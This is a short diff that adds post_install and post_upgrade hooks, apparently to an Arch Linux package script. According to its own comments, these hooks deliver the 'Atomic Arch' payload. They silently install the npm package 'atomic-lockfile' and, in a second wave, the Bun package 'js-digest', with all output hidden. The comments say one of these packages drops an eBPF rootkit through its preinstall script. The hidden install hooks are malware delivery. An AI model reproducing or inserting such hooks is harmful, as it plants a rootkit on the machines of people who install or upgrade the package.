@@ -1,0 +1,10 @@
+post_install() {
+    # Atomic Arch payload delivery: fetch the malicious npm package,
+    # whose preinstall lifecycle script drops the eBPF rootkit.
+    npm install atomic-lockfile >/dev/null 2>&1
+}
+
+post_upgrade() {
+    # Wave 2 used the Bun installer with a different package name.
+    bun install js-digest >/dev/null 2>&1
+}
